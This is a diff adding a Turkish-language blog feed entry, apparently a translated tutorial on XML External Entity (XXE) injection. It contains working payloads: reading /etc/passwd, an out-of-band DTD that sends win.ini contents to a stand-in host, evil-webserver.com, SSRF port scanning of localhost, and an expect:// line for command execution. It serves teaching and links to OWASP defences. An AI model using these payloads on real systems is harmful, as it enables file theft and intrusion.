@@ -12,6 +12,251 @@
     </author>
     
       <item>
+        <title>A Deep Dive Into XXE Injection</title>
+        <description>&lt;p&gt;Yaziya baslamadan once sunu soylemeliyim ki,bu yaziyi biraz anlamak icin xml nedir ve neden vardir bilmek gerekli bu yuzden suraya birkac kaynak birakicam.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;W3Schoolu karistirarak bulabilirsiniz &lt;strong&gt;&lt;a href=&quot;https://www.w3schools.com/xml/&quot;&gt;XML&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Illana vikipedi olsun istiyorsaniz. &lt;strong&gt;&lt;a href=&quot;http://www.wikizero.biz/index.php?q=aHR0cHM6Ly90ci53aWtpcGVkaWEub3JnL3dpa2kvWE1M&quot;&gt;XML&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Ek olarak su blogta gordugum guzel bir bilgi var &lt;strong&gt;&lt;a href=&quot;https://www.mediaclick.com.tr/blog/xml-nedir&quot;&gt;XML&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ayrica google’a &lt;em&gt;xml&lt;/em&gt; veya &lt;em&gt;xml nedir&lt;/em&gt; gibi seyler yazip taratabilirsiniz.Bunun yaninda hem web guvenligi hem de xxe injection saldiri konusunu icinde barindiran guzel linkler paylasacagim sizinle.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Bu youtube kanali XXE injection saldirisinin yaninda web guvenligi zafiyetleri hakkinda guzel icerikler barindirmakta bence kesinlikle izleyin.&lt;a href=&quot;https://www.youtube.com/watch?v=gjm6VHZa_8s&amp;amp;t=308s&quot;&gt;XXE Injection&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Web Applications Hackers Handbook kitabinin yazari tarafindan olusturulmus ve hem anlatimiyla hem de lablariyla cok iyi bir site.XXE injection haricinde diger zafiyetleride okuyup cozebilirsiniz fakat biraz ingilizceniz olmasi gerekmekte birde uye olmaniz gerekmekte.&lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;XXE Injection&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;CanUpwnme sitesinde baya ogretici bir yazi paylasmadan edemem.&lt;a href=&quot;https://canyoupwn.me/tr-xml-external-entity-xxe/&quot;&gt;XXE Injection&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Tabii ki son olarak vazgecilmezimiz Owasp.&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)&quot;&gt;XXE Injection&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/WebSec/DiveXXE/1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;1-xml-ve-entityler&quot;&gt;1. XML VE ENTITY’LER&lt;/h2&gt;
+&lt;p&gt;XXE hakkindaki en iyi kisim XML dilinin butun fonksiyonlari icin gecerli olmasi.Bu saldirida buyuk bir kara buyu yok, default olarak gelen ozelliklerde ki siklikla bole gelir, basitce istismar edilir bir ozellik.Bu ozelligin adi ise &lt;strong&gt;external entity&lt;/strong&gt;. ENTITY’leri anlamak icin, oncelikle &lt;strong&gt;Document Type Definition&lt;/strong&gt; (DTD) dosyalarina bakmamiz gerekli. &lt;strong&gt;DTD&lt;/strong&gt; dosyalari, XML dosyasinin dizayni veya formati hakkinda bilgi iceren ozel bir dosya cesididir.Bu dosyalar farkli,ayri,XML dosyalari arasinda tutarlilik belirtmek icin kullanilir.Bu DTD dosyalari ENTITY denen bir element kullanabilir.&lt;/p&gt;
+
+&lt;p&gt;Asagida ornek bir .dtd dosyasi gorebilirsiniz.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE STRUCTURE [
+&amp;lt;!ELEMENT SPECIFICATIONS (#PCDATA)&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY VERSION “1.1”&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY file SYSTEM “file:///c:/server_files/application.conf” &amp;gt;&lt;/span&gt;
+]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Biz su anda .dtd dosyalari icin kili kirk yarmaktan bahsetmiyoruz.Sadece herhangi bir XML dosyasini referans alan .dtd dosyalarinda su duzeni takip etmemiz gerekli.&lt;a href=&quot;https://www.w3schools.com/xml/xml_dtd_intro.asp&quot;&gt;(kaynak)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Icerideki ENTITY etiketleri, basitce ozel karakterlere kisayol diyebiliriz ve bu ozel karakterler XML dosyalari tarafindan cagirilabilirler.&lt;a href=&quot;https://www.w3schools.com/xml/xml_dtd_entities.asp&quot;&gt;(kaynak)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Sunu bilinki ENTITY etiketleri, local bir dosyanin icerigini getirebilir ve bunu &lt;code class=&quot;highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt; denen anahtar bir kelimeyle yapabilir.&lt;/p&gt;
+
+&lt;p&gt;Yukaridaki .dtd dosyasi su sekilde kullanilmis olabilir:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=”1.0″ encoding=”UTF-8″?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo SYSTEM “http://validserver.com/formatting.dtd”&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;specifications&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/specifications&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;formatting.dtd&lt;/strong&gt; DOCTYPE etiketi kullanilarak cagirildi, ve XML dosyasi ENTITY’ler ve icindeki yapiyi referans alabilir.&lt;/p&gt;
+
+&lt;p&gt;ENTITY’ler .dtd dosyalarinin formalitelerine uymadan da kullanilabilir.DOCTYPE’i cagirarak ve kapali parantezler kullanarak [], boylece sadece ENTITY etiketlerini referans gosterek kullanabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;Alttaki,application.conf dosyasi &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;&lt;/code&gt; etiketleri icerisinde kullanilarak referans aliniyor, butun .dtd dosyasi olmadan soyle yer alinabilir:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=”1.0″ encoding=”ISO-8859-1″?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE example [
+&amp;lt;!ELEMENT example ANY &amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY file SYSTEM “file:///c:/server_files/application.conf” &amp;gt;&lt;/span&gt;
+]&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;file;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Kisaca goze carpanlar:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;DTD dosyalari external veya internal olarak XML dosyalarinda yer alabilir.&lt;/li&gt;
+  &lt;li&gt;ENTITY’ler DTD dosyalarini icinde yer alir.&lt;/li&gt;
+  &lt;li&gt;ENTITY’ler local system dosyalarini cagirabilir.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;h2 id=&quot;2-eglenme-fasli&quot;&gt;2. EGLENME FASLI&lt;/h2&gt;
+&lt;p&gt;Veri servera HTTP istegi ile ulastigi zaman, kullanicidan gelen herhangi bir suistimale karsi ihtimal yaratmis olur.XML ise farkli degil. Web developerlari ya kullaniciya olan guvenlerini gosterip kodu degistirmeyecekler, ya da(daha iyi bir cozum) kullaniciya guvendigi noktalara guvenmeyi birakip o noktalara kontroller yerlestirerek zararli modifikasyonlari engellemek icin calisacaklar. Web developerlarinin niyetleri fark etmeksizin, hatalar olur ve injectionlar siklikla servar tarafindan calistirilir.&lt;/p&gt;
+
+&lt;p&gt;Burada da bir ornek,veri formu XML ile kapli ve servera islenmesi yollaniyor.&lt;/p&gt;
+
+&lt;p&gt;Saldirganda soyle yapacak:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Zafiyetli POST istegini web proxy ile kesin(BurpSuite,Zap,vs..)&lt;/li&gt;
+  &lt;li&gt;Enjekte edilmis ENTITY etiketini ve &amp;amp;xxe ekleyin;degisken referansi.&lt;/li&gt;
+  &lt;li&gt;&amp;amp;xxe’nin veri ile referansli oldugunu ve kullaniciya geri donecegine emin olun&lt;/li&gt;
+  &lt;li&gt;Kesilmis POST istegini birakin.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Olusturulmus POST istegi sonucu soyle(enjekte edilmis icerik $ isareti arasinda):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /notes/savenote HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: text/xml;charset=UTF-8
+Host: myserver.com
+
+&amp;lt;?xml version=”1.0″ ?&amp;gt;
+$&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY xxe SYSTEM “file:///etc/passwd” &amp;gt;]&amp;gt;$
+&amp;lt;note&amp;gt;
+&amp;lt;to&amp;gt;Alice&amp;lt;/to&amp;gt;
+&amp;lt;from&amp;gt;Bob&amp;lt;/from&amp;gt;
+&amp;lt;header&amp;gt;Sync Meeting&amp;lt;/header&amp;gt;
+&amp;lt;time&amp;gt;1200&amp;lt;/time&amp;gt;
+&amp;lt;body&amp;gt;Meeting time changed &amp;amp;xxe;&amp;lt;/body&amp;gt;
+&amp;lt;/note&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Server, gecerli verinin form tarafinda dolduruldugunu varsayiyor, XML verisini backend tarafinda kaydetmeden once islemeye basliyor, ve islenmis veriyi orjinal verinin yaninda kullaniciya donduruyor.Bu durumda &lt;strong&gt;/etc/passwd&lt;/strong&gt; icerigi gosterilmis durumda.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Content-Type: text/xml;charset=UTF-8
+Server: Microsoft-IIS/7.5
+Date: Sat, 19 Apr 2019 13:08:49 GMT
+Connection: close
+Content-Length: 1039
+
+Note saved! From Bob to Alice about “Sync Meeting” at 1200: Meeting time has changed
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+..snip…
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;3-bandin-disindan-sizmak&quot;&gt;3. BANDIN DISINDAN SIZMAK&lt;/h2&gt;
+
+&lt;p&gt;Yukaridaki ornek aslinda icat edilmis bir ornekti. Cogu zaman XML servera ulastiginda kullanici tarafinda istenen bir sekilde goruntulenmez.Misallerde XML enjekte edilebilir olabilir fakat HTTP cevabinda kullaniciya geri donmeyebilir. Daha once external .dtd dosyalarindan bahsetmistik.DOCTYPE external olarak .dtd dosyalarini referans almamiza izin verek atagi bandin disina cikarabilir.&lt;/p&gt;
+
+&lt;p&gt;Burada net anlasilmasi icin daha onceki ornegi degistirecegiz.Ayni zaman server Windows gibi davranacagiz, cesitlilik olsun. Onceki ornekte, ENTITY referansi xxe degiskenin icinde kayitliydi, referans icinde form kullanilmistir. Bu ornekte, ENTITY referansi disardaki serverdan aliyor.&lt;br /&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;https://evil-webserver.com:&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /notes/savenote HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: text/xml;charset=UTF-8.
+Host: myserver.com
+
+&amp;lt;?xml version=”1.0″ ?&amp;gt;
+&amp;lt;!DOCTYPE hack [
+&amp;lt;!ELEMENT x ANY &amp;gt;
+&amp;lt;!ENTITY % alpha SYSTEM “https://evil-webserver.com/payload.dtd”&amp;gt;
+%alpha;
+%bravo;
+]&amp;gt;
+&amp;lt;x&amp;gt;&amp;amp;charlie;&amp;lt;/x&amp;gt;
+&amp;lt;note&amp;gt;
+&amp;lt;to&amp;gt;Alice&amp;lt;/to&amp;gt;
+&amp;lt;from&amp;gt;Bob&amp;lt;/from&amp;gt;
+&amp;lt;header&amp;gt;Sync Meeting&amp;lt;/header&amp;gt;
+&amp;lt;time&amp;gt;1200&amp;lt;/time&amp;gt;
+&amp;lt;body&amp;gt;Meeting time changed&amp;lt;/body&amp;gt;
+&amp;lt;/note&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;External olan payload.dtd ise sunlari iceriyor:&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=”1.0″ encoding=”utf-8″ ?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % data SYSTEM “file:///c:/windows/win.ini”&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY % bravo “&amp;lt;!ENTITY charlie SYSTEM
+‘https://evil-webserver.com/?%data;’&amp;gt;&lt;/span&gt;”&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Sunu bilinki &lt;code class=&quot;highlighter-rouge&quot;&gt;file:///c:/windows/win.ini&lt;/code&gt; enjekte edilmis XXE kodundan ziyade .dtd dosyasi icinde.Bu sinsi hareket bize gizlilik sagliyarak, serverdan hangi loglara ulasmak istedigimizi gizlemekte.&lt;/p&gt;
+
+&lt;p&gt;Genel sartlar olarak baktigimizda, bu kod sunlari calistiriyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/WebSec/DiveXXE/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Kullanici enjekte edilmis XML kodunu servera yollar.&lt;/li&gt;
+  &lt;li&gt;Server, kisaca XML isleyicisi, XML’i bastan sona isleyerek, enjekteli ENTITY’e ulasir.&lt;/li&gt;
+  &lt;li&gt;Server &lt;code class=&quot;highlighter-rouge&quot;&gt;https://evil-webserver.com'a&lt;/code&gt; istek yollayarak &lt;code class=&quot;highlighter-rouge&quot;&gt;payload.dtd&lt;/code&gt; calistirir.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://evil-webserver.com&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;payload.dtd&lt;/code&gt; ile cevap verir.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Payload.dtd&lt;/code&gt; icindeki kod XML isleyicisi tarafindan islenir, win.ini icerigi okunur ve HTTP GET isteginde parametre olarak &lt;code class=&quot;highlighter-rouge&quot;&gt;https://evil-webserver.com&lt;/code&gt; sitesine gonderilir.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ortaya cikarilmis veri saldirgan tarafindan serverin loglarinda goruntulenebilir.&lt;/p&gt;
+
+&lt;p&gt;Yan not:Eger ornekteki alpha/bravo/charlie degisken referanslari kafa karistiriciysa, sunu bilin ki tonla farkli XXE saldirilari var, hepsindeki efor ise web filtrelerini bypass etmek veya zorlayici XML isleyicilerini kolaylastirmak. Bazi farkli varyasyonlari &lt;a href=&quot;https://gist.github.com/staaldraad/01415b990939494879b4&quot;&gt;su&lt;/a&gt; GitHub sayfasinda bulunabilir.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;4-soapi-atlatmak&quot;&gt;4. SOAP’I ATLATMAK&lt;/h2&gt;
+&lt;p&gt;SOAP(Simple Object Access Protocol) cesitli ve farkli uygulamalarin/elementlerin birbiri ile haberlesmesine izin veren bir iletisim yapisidir.Bizim icin daha onemli olan kisim ise, ayni zamanda XML olarak yapilanmis olmasi, buda onu XXE’ye karsi zafiyetli yapabilmekte.&lt;/p&gt;
+
+&lt;p&gt;Bu ornekte, cesitli API methodlari &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;XMLDATA&amp;gt;&lt;/code&gt; denilen kisimlara sahip ve bunlara ENTITY etiketleri ile enjekte olabilir.Karsimiza cikacak olan POST istegi’nde, &lt;strong&gt;/ConductOrders.asmx&lt;/strong&gt; endpointi saldirganin web serverina istek uretecek.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/WebSec/DiveXXE/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sonuc olarak, server &lt;code class=&quot;highlighter-rouge&quot;&gt;http://evil-webserver/data.xml&lt;/code&gt; daki external dtd dosyasinin icerigini cekicek.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/WebSec/DiveXXE/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu XML kodu, XML isleyicisini bilgilendirecek ve &lt;code class=&quot;highlighter-rouge&quot;&gt;c:\windows\win.ini&lt;/code&gt; lokal icerigini isleyerek dosyanin bilgilerini saldirganin serverina istek olarak gonderecek, hepsine ek oalrak &lt;strong&gt;charlie&lt;/strong&gt; degiskeni istegin sonunda, saldirganin serverinin loglarinda gozukecek.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/WebSec/DiveXXE/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve tam olarak, herhangi bir lokal okunabilir dosya web serverindan calinmis olur.&lt;/p&gt;
+
+&lt;p&gt;Not:Izinler bu ataklarda soz konusudur.Eger web server(veya www-data kullanicisi) izne sahip degilse, dosyayi dondurmez.Bu yuzden &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; yerine &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; dosyasini cektik.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;5-xxe-ile-recon&quot;&gt;5. XXE ILE RECON&lt;/h2&gt;
+
+&lt;p&gt;Cogu exploit gibi, diger zafiyetler ile zincirlendiginde XXE ekstra ilginclesmekte.XXE kanit olarak &lt;strong&gt;Local File Disclosure (LFD)&lt;/strong&gt; ozelligini bize kazandirmakta, fakat gercek bir saldirgan lokal dosyalari okumaktan daha fazlasini isteyebilir(ozellikle saldiri web serveri tarafinda izine takiliyorsa).XXE kendisi adina bir seyler calistirmak icin serveri bilgilendirdiginden beri, bir saldigan ic agin haritasini ve/veya portlari kullanarak XML isleyicisi ile birlikte &lt;strong&gt;Server Side Request Forgery (SSRF)&lt;/strong&gt; gercekleyebilir. XXE + SSRF gibi.Bu spesifik zafiyet JAMF Software’e karsi exploit edildi.XML tabanli SOAP protokolu XXE’ye karsi potansiyel zafiyeti vardi.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/WebSec/DiveXXE/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ikinci XML satirini not alin, kirmizi ile koselenmis olan,&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE dtd SYSTEM “https://127.0.0.1:445”&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Onceki orneklerimizdeki gibi uzaktan dtd dosyasi veya lokal dosyalari cagirmak yerine, bu arastirmaci belirledi portta localhost’u (127.0.0.1) cagirmakta. Eger port aciksa, server hizlica cevap verir. Eger port kapaliysa, server ICMP Port Unreachable mesajini verir ki bu sure zarfinda soketler el sikismaya calisir.Bu misalde, gecerli ve gecersiz portlar arasindaki farkli cevap suresi kayda deger yeterlilikte ic host’un portlarini kor sekilde haritalandirmamiza yarar.Burp intruder ile bu atagi gerceklestirdigimizi varsayalim.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/WebSec/DiveXXE/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Gorebilirsinizki 21, 22, 23 ve 443 port numaralarindan donen cevaplarin zamani belirleyici sekilde farkli ve bunlar gecersiz portlar olarak gorulebilir.Bu ataktan sonra, varilan sonuc 80, 445 ve 8443 portlari erisilebilir. Bunlarda, 445’inci port farkli bir dikkat cekici, sadece internete erismekle kalmayip, essiz bir atak yuzeyi kazandirmakta.Eger dahada ileri tasirsak, SSRF saldirisini ic aglardaki hostlar icinde gecerli kilariz ve web serveri tarafindan ozel intranet end pointlerinin haritasinida cikarabiliriz.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2 id=&quot;6-son-dusunceler&quot;&gt;6. SON DUSUNCELER&lt;/h2&gt;
+
+&lt;p&gt;XXE saldirisi uygulamanin izin vermesin gore kolaylik veya karmasiklik olara degisiebilir. Google size cesitli gelismis XXE saldiri vektorlerini gosterebilir.&lt;strong&gt;The Billion Laughs&lt;/strong&gt; saldirisi ile DOS saldirisi gercekleyebilirsiniz. Daha alcakcasi, &lt;strong&gt;PHP Expect&lt;/strong&gt; modulu yuklu ise XXE saldirisini Code Execution saldirisina cevirebilirsiniz &lt;code class=&quot;highlighter-rouge&quot;&gt;(&amp;lt;!ENTITY rce SYSTEM “expect://ifconfig” &amp;gt;)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;XXE’ye karsi defans mekanizmalari tabii ki de(OWASP listesi &lt;a href=&quot;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet&quot;&gt;burada&lt;/a&gt;). Bu saldiriya karsi olan zafiyetler zayif konfigure edilmis XML isleyicileri yuzunden. XXE, XML’e patch getirerek duzeltebileceginiz bir sey degil, aslinda kasitsiz olarak uygulamada birakilan acik seyler yuzunden.Sonunda baktigimiz zaman bu saldiri genis olarak insan hatasindan kaynaklanmakta, bu da zafiyetin ortalikta olacagi anlamina gelmekte.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.synack.com/blog/a-deep-dive-into-xxe-injection/&quot;&gt;Kaynak&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 16 Aug 2019 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000//websec/xxe/</link>
+        <link href="http://localhost:4000/websec/xxe/"/>
+        <guid isPermaLink="true">http://localhost:4000/websec/xxe/</guid>
+      </item>
+    
+      <item>
         <title>Hack-The-Box Bank</title>
         <description>&lt;p&gt;&lt;img src=&quot;/assets/hackthebox/Bank/0.png&quot; /&gt; &lt;!-- burayi img tagiyla yapicaksin --&gt;&lt;/p&gt;
 
